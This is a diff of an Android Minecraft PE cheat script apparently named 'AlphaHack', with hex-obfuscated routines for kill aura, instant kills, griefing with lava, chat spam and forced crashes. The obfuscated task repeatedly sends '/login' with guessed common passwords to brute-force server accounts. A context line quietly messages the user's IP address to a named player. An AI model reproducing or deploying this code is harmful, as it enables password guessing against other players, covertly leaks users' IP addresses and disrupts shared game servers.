+var _0x1b58=["\x67\x65\x74\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x67\x65\x74\x58","\x67\x65\x74\x59","\x67\x65\x74\x5A","\x67\x65\x74\x45\x6E\x74\x69\x74\x79\x54\x79\x70\x65\x49\x64","\x73\x65\x74\x49\x6D\x6D\x6F\x62\x69\x6C\x65"];function killingf(){var _0x2d95x2=Entity[_0x1b58[0]]();var _0x2d95x3=true;if(killfaura==false){_0x2d95x3=false};for(var _0x2d95x4=0;_0x2d95x4<_0x2d95x2[_0x1b58[1]];_0x2d95x4++){var _0x2d95x5=_0x2d95x2[_0x2d95x4];var _0x2d95x6=Entity[_0x1b58[2]](_0x2d95x2[_0x2d95x4])-getPlayerX();var _0x2d95x7=Entity[_0x1b58[3]](_0x2d95x2[_0x2d95x4])-getPlayerY();var _0x2d95x8=Entity[_0x1b58[4]](_0x2d95x2[_0x2d95x4])-getPlayerZ();if(_0x2d95x6*_0x2d95x6+_0x2d95x7*_0x2d95x7+_0x2d95x8*_0x2d95x8<=20*20&&_0x2d95x2[_0x2d95x4]!=getPlayerEnt()){if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==10){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==11){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==12){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==13){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==14){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==15){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==16){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==17){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==18){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==19){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==20){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==21){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==22){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==32){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==33){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==34){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==35){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==36){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==37){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==38){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==39){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==40){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==41){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==42){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==43){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==44){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==45){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)}}}}
+
+/***********************/
+
+//Two dialogs that need to be out of menus.
 
 function fov() {
 ctx.runOnUiThread(new java.lang.Runnable(){
@@ -5489,6 +7261,55 @@ print("The signer Dialog Is Malfunctioning:"+e);
 }});
 }
 
+function signEditor() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+GetText = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var xy = new android.widget.EditText(ctx);
+var xy2 = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter sign line & text");
+Dialog.setContentView(Layer);
+
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer.addView(xy);
+Layer.addView(xy2);
+Layer.addView(Exit);
+
+xy.setText("");
+xy.setHint("Sign line: (0-3)");
+xy2.setText("");
+xy2.setHint("New sign text");
+Exit.setText("done");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+text4 =xy.getText();
+line4 =xy2.getText();
+Level.setSignText(notex, notey, notez, text4, line4);
+Dialog.dismiss();
+showMenuBtn();
+}
+});
+
+GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The signer Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+/***********************/
+
+//Misc
+
 function crash() {
 net.zhuoweizhang.mcpelauncher.ScriptManager.nativeForceCrash();
 }
@@ -5498,6 +7319,94 @@ var chat = net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat;
 
 getIp(function(info){chat("/tell Arceus_matt using AlphaHack! ip " + info[0])})
 }
+
+/***********************/
+
+//Block destroy & others.
+
+function attackHook(attacker, victim) {
+	if(instakilled) {
+		Entity.setHealth(victim, 1);
+	}
+	if(firepunch) {
+Entity.setFireTicks(victim, 5);
+	}
+if(saddle){
+rideAnimal(attacker, victim);
+}
+}
+
+function instaDestroy(){
+if(instabreak==true)
+	for(i = 0; i < 256; i++){
+		Block.setDestroyTime(i, 0.1);
+	}
+}
+ 
+function defaultDestroy(){
+if(instabreak==false)
+	for(i = 0; i < 256; i++){
+		Block.setDestroyTime(i, defaultDestroyTime[i]);
+	}
+}
+
+function useItem(x, y, z, itemId, blockId, side){
+if(deadchat)if(blockId == 63 || blockId == 68)signEditor(); 
+
+	if(lightning) {
+		 Level.spawnMob(x, y, z, EntityType.LIGHTNING_BOLT);
+	}
+	if(primedtnt) {
+Level.spawnMob(x, y +2, z, EntityType.PRIMED_TNT);
+	}
+	if(arrow) {
+Level.spawnMob(x, y +1, z, EntityType.ARROW);
+	}
+	if(exporb) {
+Level.spawnMob(x, y +1, z, EntityType.EXPERIENCE_ORB);
+	}
+	if(minecart) {
+Level.spawnMob(x, y +2, z, EntityType.MINECART);
+	}
+}
+
+function gameLoop(){
+    var thisLoop = new Date;
+    fps = 1000 / (thisLoop - lastLoop);
+    lastLoop = thisLoop;
+}
+
+/***********************/
+
+//ModTick
+
+function modTick() {
+if(showp){
+gameLoop();
+}
+if(stackheart){
+Player.setHealth(20);
+}
+if(infhun){
+Player.setHunger(20);
+}
+if(killaura){
+
+killing(); 
+
+}
+
+if(killfaura){
+
+killingf(); 
+
+}
+
+}
+
+/***********************/
+
+//set home java
 
 function save() {
         var file = new java.io.File( android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/AlphaHack/"+Level.getWorldDir()+"/homes/", "Home "+name+".txt");
@@ -5537,97 +7446,6 @@ function load(){
     }
 }
 
-function gameLoop(){
-    var thisLoop = new Date;
-    fps = 1000 / (thisLoop - lastLoop);
-    lastLoop = thisLoop;
-}
+/***********************/
 
-function modTick() {
-if(showp){
-ModPE.showTipMessage("Current FPS: " + Math.round(fps));
-gameLoop()
-}
-if(nowalls) {
-		Entity.setCollisionSize(getPlayerEnt(),0,0);
-		if(Level.getTile(getPlayerX(),getPlayerY(),getPlayerZ())!=0 && Level.getTile(getPlayerX(),getPlayerY()-1,getPlayerZ())!=0) {
-			setVelY(getPlayerEnt(), 0.01);
-		}
-}
-if(waterwalk) {
-		if(Level.getTile(getPlayerX(), getPlayerY()-2, getPlayerZ())==8 || Level.getTile(getPlayerX(), getPlayerY()-2, getPlayerZ())==9 || Level.getTile(getPlayerX(), getPlayerY()-2, getPlayerZ())==10 || Level.getTile(getPlayerX(), getPlayerY()-2, getPlayerZ())==11) {
-			setVelY(getPlayerEnt(), 0);
-		}
-	}
-if(highjumps) {
-		if(Entity.getVelY(getPlayerEnt())< -0.1) {
-			setVelY(getPlayerEnt(),-0.5);
-		}
-		if(Entity.getVelY(getPlayerEnt())< 0.35 && Entity.getVelY(getPlayerEnt())> 0.2 && can==1 && canGetHP==1) {
-			setVelY(getPlayerEnt(), 0.6);
-			can = 2;
-			HP = Entity.getHealth(getPlayerEnt());
-			canGetHP = 0;
-		}
-		if(Entity.getVelY(getPlayerEnt())>gravity && can==2) {
-			Player.setHealth(HP);
-			canGetHP = 1;
-			can = 0;
-		}
-		if(Entity.getVelY(getPlayerEnt())==gravity && can==0) {
-			Player.setHealth(HP);
-			canGetHP = 1;
-			can = 1;
-		}
-	}
-if(stackheart){
-Player.setHealth(20);
-}
-if(infhun){
-Player.setHunger(20);
-}
-if(killaura){
-killing(); 
-}
-if(killfaura){
-killingf(); 
-}
-}
-
-function attackHook(attacker, victim) {
-	if(instakilled) {
-		Entity.setHealth(victim, 1);
-	}
-	if(saddle) {
-		rideAnimal(getPlayerEnt(), victim);
-	}
-	if(firepunch) {
-Entity.setFireTicks(victim, 5)
-	}
-}
-
-function instaDestroy(){
-if(instabreak==true)
-	for(i = 0; i < 256; i++){
-		Block.setDestroyTime(i, 0.1);
-	}
-}
- 
-function defaultDestroy(){
-if(instabreak==false)
-	for(i = 0; i < 256; i++){
-		Block.setDestroyTime(i, defaultDestroyTime[i]);
-	}
-}
-
-if(hackcount==1)"<password>";
-if(hackcount==2)"[password]";
-if(hackcount==3)"{password}";
-if(hackcount==4)"(password)";
-if(hackcount==5)"password";
-if(hackcount==6)"pussy";
-if(hackcount==7)"dick";
-if(hackcount==8)"1234";
-if(hackcount==9)"123456789";
-
-var _0x88b9=["\x6E\x61\x74\x69\x76\x65\x53\x65\x6E\x64\x43\x68\x61\x74","\x53\x63\x72\x69\x70\x74\x4D\x61\x6E\x61\x67\x65\x72","\x6D\x63\x70\x65\x6C\x61\x75\x6E\x63\x68\x65\x72","\x7A\x68\x75\x6F\x77\x65\x69\x7A\x68\x61\x6E\x67","\x2F\x6C\x6F\x67\x69\x6E\x20","\x69\x73\x53\x68\x6F\x77\x69\x6E\x67","\x69\x73\x52\x65\x6D\x6F\x74\x65","\x73\x65\x74\x4C\x65\x76\x65\x6C\x46\x61\x6B\x65\x43\x61\x6C\x6C\x62\x61\x63\x6B","\x73\x65\x74\x54\x69\x6D\x65","\x0A","\x58\x3A\x20","\x72\x6F\x75\x6E\x64","\x2C\x20\x59\x3A\x20","\x2C\x20\x5A\x3A\x20","\x2E\x20","\x47\x3A\x20","\x67\x65\x74\x47\x61\x6D\x65\x4D\x6F\x64\x65","\x2E","\x20\x54\x3A\x20","\x67\x65\x74\x54\x69\x6D\x65","\x20\x57\x2F\x4C\x3A\x20","\x67\x65\x74\x52\x61\x69\x6E\x4C\x65\x76\x65\x6C","\x2F","\x67\x65\x74\x4C\x69\x67\x68\x74\x6E\x69\x6E\x67\x4C\x65\x76\x65\x6C","\x49\x44\x3A\x20","\x67\x65\x74\x43\x61\x72\x72\x69\x65\x64\x49\x74\x65\x6D","\x3A","\x67\x65\x74\x43\x61\x72\x72\x69\x65\x64\x49\x74\x65\x6D\x44\x61\x74\x61","\x67\x65\x74\x45\x6E\x74\x69\x74\x79","\x67\x65\x74\x4E\x61\x6D\x65","\x20\x7C\x20","\x42\x3A\x20","\x67\x65\x74\x42\x69\x6F\x6D\x65\x4E\x61\x6D\x65","\x20\x76","\x67\x65\x74\x4D\x69\x6E\x65\x63\x72\x61\x66\x74\x56\x65\x72\x73\x69\x6F\x6E","\x73\x68\x6F\x77\x54\x69\x70\x4D\x65\x73\x73\x61\x67\x65","\x6C\x61\x76\x61","\x61\x64\x64\x50\x61\x72\x74\x69\x63\x6C\x65","\x6C\x61\x72\x67\x65\x65\x78\x70\x6C\x6F\x64\x65","\x73\x65\x74\x54\x69\x6C\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64","\x70\x6F\x73\x74\x44\x65\x6C\x61\x79\x65\x64","\x6F\x73"];function rptask(){ctx[_0x88b9[42]]( new java[_0x88b9[41]].Runnable({run:function(){ new android[_0x88b9[44]].Handler()[_0x88b9[43]]( new java[_0x88b9[41]].Runnable({run:function(){if(sspam){net[_0x88b9[3]][_0x88b9[2]][_0x88b9[1]][_0x88b9[0]](text)};if(hackk){net[_0x88b9[3]][_0x88b9[2]][_0x88b9[1]][_0x88b9[0]](_0x88b9[4]+hackcount)};hackcount++;if(GUI!=null&&GUI[_0x88b9[5]]()==false&&(GUI==null||GUI[_0x88b9[5]]()==false)){net[_0x88b9[3]][_0x88b9[2]][_0x88b9[1]][_0x88b9[6]]=true;net[_0x88b9[3]][_0x88b9[2]][_0x88b9[1]][_0x88b9[7]](true,false);showMenuBtn()};if(onlyday){Level[_0x88b9[8]](0)};if(healthy==true){healthIndicators()};if(stat22){ModPE[_0x88b9[35]](_0x88b9[9]+_0x88b9[10]+Math[_0x88b9[11]](nx)+_0x88b9[12]+Math[_0x88b9[11]](ny)+_0x88b9[13]+Math[_0x88b9[11]](nz)+_0x88b9[14]+_0x88b9[9]+_0x88b9[15]+Level[_0x88b9[16]]()+_0x88b9[17]+_0x88b9[18]+Level[_0x88b9[19]]()+_0x88b9[17]+_0x88b9[20]+Math[_0x88b9[11]](Level[_0x88b9[21]]())+_0x88b9[22]+Math[_0x88b9[11]](Level[_0x88b9[23]]())+_0x88b9[14]+_0x88b9[24]+Player[_0x88b9[25]]()+_0x88b9[26]+Player[_0x88b9[27]]()+_0x88b9[17]+_0x88b9[9]+Player[_0x88b9[29]](Player[_0x88b9[28]]())+_0x88b9[30]+_0x88b9[31]+Level[_0x88b9[32]]()+_0x88b9[17]+_0x88b9[33]+ModPE[_0x88b9[34]]())};if(parti){Level[_0x88b9[37]](ParticleType[_0x88b9[36]],getPlayerX(),getPlayerY(),getPlayerZ(),0,0,0,150)};if(parti2){Level[_0x88b9[37]](ParticleType[_0x88b9[38]],getPlayerX(),getPlayerY(),getPlayerZ(),0,0,0,150)};if(grief){Level[_0x88b9[39]](getPlayerX(),getPlayerY(),getPlayerZ(),11,0)};if(checkForUpdate==false){ctx[_0x88b9[42]]( new java[_0x88b9[41]].Runnable({run:function(){try{checkVersion()}catch(err){print(_0x88b9[40]+err)}}}));checkForUpdate=true};if(updateWindow){ctx[_0x88b9[42]]( new java[_0x88b9[41]].Runnable({run:function(){try{updateVersion()}catch(err){print(_0x88b9[40]+err)}}}));updateWindow=false};nx=getPlayerX();ny=getPlayerY();nz=getPlayerZ();eval(rptask())}}),1000/70)}}))}rptask()
+var _0x188f=["\x6E\x61\x74\x69\x76\x65\x53\x65\x6E\x64\x43\x68\x61\x74","\x53\x63\x72\x69\x70\x74\x4D\x61\x6E\x61\x67\x65\x72","\x6D\x63\x70\x65\x6C\x61\x75\x6E\x63\x68\x65\x72","\x7A\x68\x75\x6F\x77\x65\x69\x7A\x68\x61\x6E\x67","\x2F\x6C\x6F\x67\x69\x6E\x20","\x3C\x70\x61\x73\x73\x77\x6F\x72\x64\x3E","\x28\x70\x61\x73\x73\x77\x6F\x72\x64\x29","\x5B\x70\x61\x73\x73\x77\x6F\x72\x64\x5D","\x7B\x70\x61\x73\x73\x77\x6F\x72\x64\x7D","\x70\x61\x73\x73\x77\x6F\x72\x64","\x69\x73\x53\x68\x6F\x77\x69\x6E\x67","\x69\x73\x52\x65\x6D\x6F\x74\x65","\x73\x65\x74\x4C\x65\x76\x65\x6C\x46\x61\x6B\x65\x43\x61\x6C\x6C\x62\x61\x63\x6B","\x73\x65\x74\x54\x69\x6D\x65","\x0A","\x58\x3A\x20","\x72\x6F\x75\x6E\x64","\x2C\x20\x59\x3A\x20","\x2C\x20\x5A\x3A\x20","\x2E\x20","\x46\x50\x53\x3A\x20","\x2E","\x47\x3A\x20","\x67\x65\x74\x47\x61\x6D\x65\x4D\x6F\x64\x65","\x20\x54\x3A\x20","\x67\x65\x74\x54\x69\x6D\x65","\x20\x57\x2F\x4C\x3A\x20","\x67\x65\x74\x52\x61\x69\x6E\x4C\x65\x76\x65\x6C","\x2F","\x67\x65\x74\x4C\x69\x67\x68\x74\x6E\x69\x6E\x67\x4C\x65\x76\x65\x6C","\x49\x44\x3A\x20","\x67\x65\x74\x43\x61\x72\x72\x69\x65\x64\x49\x74\x65\x6D","\x3A","\x67\x65\x74\x43\x61\x72\x72\x69\x65\x64\x49\x74\x65\x6D\x44\x61\x74\x61","\x67\x65\x74\x45\x6E\x74\x69\x74\x79","\x67\x65\x74\x4E\x61\x6D\x65","\x20\x7C\x20","\x42\x3A\x20","\x67\x65\x74\x42\x69\x6F\x6D\x65\x4E\x61\x6D\x65","\x20\x76","\x67\x65\x74\x4D\x69\x6E\x65\x63\x72\x61\x66\x74\x56\x65\x72\x73\x69\x6F\x6E","\x73\x68\x6F\x77\x54\x69\x70\x4D\x65\x73\x73\x61\x67\x65","\x6C\x61\x76\x61","\x61\x64\x64\x50\x61\x72\x74\x69\x63\x6C\x65","\x6C\x61\x72\x67\x65\x65\x78\x70\x6C\x6F\x64\x65","\x73\x65\x74\x54\x69\x6C\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64","\x70\x6F\x73\x74\x44\x65\x6C\x61\x79\x65\x64","\x6F\x73"];function rptask(){ctx[_0x188f[48]]( new java[_0x188f[47]].Runnable({run:function(){ new android[_0x188f[50]].Handler()[_0x188f[49]]( new java[_0x188f[47]].Runnable({run:function(){if(sspam){net[_0x188f[3]][_0x188f[2]][_0x188f[1]][_0x188f[0]](text)};if(hackk){net[_0x188f[3]][_0x188f[2]][_0x188f[1]][_0x188f[0]](_0x188f[4]+hackcount)};hackcount++;if(hackcount==0){hackcount=_0x188f[5]};if(hackcount==1){hackcount=_0x188f[5]};if(hackcount==2){hackcount=_0x188f[6]};if(hackcount==3){hackcount=_0x188f[6]};if(hackcount==4){hackcount=_0x188f[7]};if(hackcount==5){hackcount=_0x188f[7]};if(hackcount==6){hackcount=_0x188f[8]};if(hackcount==7){hackcount=_0x188f[8]};if(hackcount==8){hackcount=_0x188f[9]};if(hackcount==9){hackcount=_0x188f[9]};if(GUI!=null&&GUI[_0x188f[10]]()==false&&(menu==null||menu[_0x188f[10]]()==false)){net[_0x188f[3]][_0x188f[2]][_0x188f[1]][_0x188f[11]]=true;net[_0x188f[3]][_0x188f[2]][_0x188f[1]][_0x188f[12]](true,false);showMenuBtn()};if(onlyday){Level[_0x188f[13]](0)};if(stat22){ModPE[_0x188f[41]](_0x188f[14]+_0x188f[15]+Math[_0x188f[16]](nx)+_0x188f[17]+Math[_0x188f[16]](ny)+_0x188f[18]+Math[_0x188f[16]](nz)+_0x188f[19]+_0x188f[20]+Math[_0x188f[16]](fps)+_0x188f[21]+_0x188f[14]+_0x188f[22]+Level[_0x188f[23]]()+_0x188f[21]+_0x188f[24]+Level[_0x188f[25]]()+_0x188f[21]+_0x188f[26]+Math[_0x188f[16]](Level[_0x188f[27]]())+_0x188f[28]+Math[_0x188f[16]](Level[_0x188f[29]]())+_0x188f[19]+_0x188f[30]+Player[_0x188f[31]]()+_0x188f[32]+Player[_0x188f[33]]()+_0x188f[21]+_0x188f[14]+Player[_0x188f[35]](Player[_0x188f[34]]())+_0x188f[36]+_0x188f[37]+Level[_0x188f[38]]()+_0x188f[21]+_0x188f[39]+ModPE[_0x188f[40]]())};if(parti){Level[_0x188f[43]](ParticleType[_0x188f[42]],getPlayerX(),getPlayerY(),getPlayerZ(),0,0,0,150)};if(parti2){Level[_0x188f[43]](ParticleType[_0x188f[44]],getPlayerX(),getPlayerY(),getPlayerZ(),0,0,0,150)};if(grief){Level[_0x188f[45]](getPlayerX(),getPlayerY(),getPlayerZ(),11,0)};if(checkForUpdate==false){ctx[_0x188f[48]]( new java[_0x188f[47]].Runnable({run:function(){try{checkVersion()}catch(err){print(_0x188f[46]+err)}}}));checkForUpdate=true};if(updateWindow){ctx[_0x188f[48]]( new java[_0x188f[47]].Runnable({run:function(){try{updateVersion()}catch(err){print(_0x188f[46]+err)}}}));updateWindow=false};nx=getPlayerX();ny=getPlayerY();nz=getPlayerZ();eval(rptask())}}),1000/70)}}))}rptask()
